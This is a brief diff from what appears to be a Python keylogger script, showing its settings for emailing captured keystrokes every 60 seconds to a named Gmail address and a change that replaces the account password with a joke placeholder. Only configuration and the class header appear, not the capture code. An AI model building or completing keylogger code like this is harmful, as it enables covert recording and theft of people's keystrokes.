@@ -8,7 +8,7 @@ from datetime import datetime
 SEND_REPORT_EVERY = 60
 # Send to 
 EMAIL_ADDRESS = "poop96590@gmail.com"
-EMAIL_PASSWORD = "f@k3p@$$w0rd"
+EMAIL_PASSWORD = "sorry i can't afford to have my password on the internet anymore"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
